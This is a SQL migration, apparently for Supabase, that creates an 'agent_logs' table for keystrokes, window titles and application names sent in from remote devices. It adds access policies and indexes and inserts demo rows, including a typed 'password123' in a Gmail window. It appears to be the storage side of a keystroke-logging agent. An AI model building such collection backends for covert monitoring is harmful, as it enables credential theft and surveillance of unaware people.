-- Create agent_logs table if it doesn't exist
CREATE TABLE IF NOT EXISTS agent_logs (
  id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
  user_id UUID REFERENCES auth.users(id) ON DELETE CASCADE,
  device_id TEXT NOT NULL,
  keystroke TEXT NOT NULL,
  window_title TEXT,
  application TEXT,
  metadata JSONB DEFAULT '{}',
  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Enable RLS
ALTER TABLE agent_logs ENABLE ROW LEVEL SECURITY;

-- Create RLS policies
DROP POLICY IF EXISTS "Users can view their own logs" ON agent_logs;
CREATE POLICY "Users can view their own logs"
ON agent_logs FOR SELECT
USING (auth.uid() = user_id);

DROP POLICY IF EXISTS "Users can insert their own logs" ON agent_logs;
CREATE POLICY "Users can insert their own logs"
ON agent_logs FOR INSERT
WITH CHECK (auth.uid() = user_id);

-- Enable realtime
ALTER PUBLICATION supabase_realtime ADD TABLE agent_logs;

-- Create indexes for better performance
CREATE INDEX IF NOT EXISTS idx_agent_logs_user_id ON agent_logs(user_id);
CREATE INDEX IF NOT EXISTS idx_agent_logs_device_id ON agent_logs(device_id);
CREATE INDEX IF NOT EXISTS idx_agent_logs_created_at ON agent_logs(created_at DESC);

-- Insert some sample data for testing
INSERT INTO agent_logs (user_id, device_id, keystroke, window_title, application, metadata)
SELECT 
  auth.uid(),
  'DEMO-PC-' || (random() * 100)::int,
  CASE (random() * 5)::int
    WHEN 0 THEN 'Hello World'
    WHEN 1 THEN 'password123'
    WHEN 2 THEN 'npm install'
    WHEN 3 THEN '[Ctrl+C]'
    ELSE 'SELECT * FROM users'
  END,
  CASE (random() * 3)::int
    WHEN 0 THEN 'Notepad - Untitled'
    WHEN 1 THEN 'Chrome - Gmail'
    ELSE 'Terminal'
  END,
  CASE (random() * 3)::int
    WHEN 0 THEN 'notepad.exe'
    WHEN 1 THEN 'chrome.exe'
    ELSE 'cmd.exe'
  END,
  '{"demo": true}'::jsonb
WHERE auth.uid() IS NOT NULL
ON CONFLICT DO NOTHING;
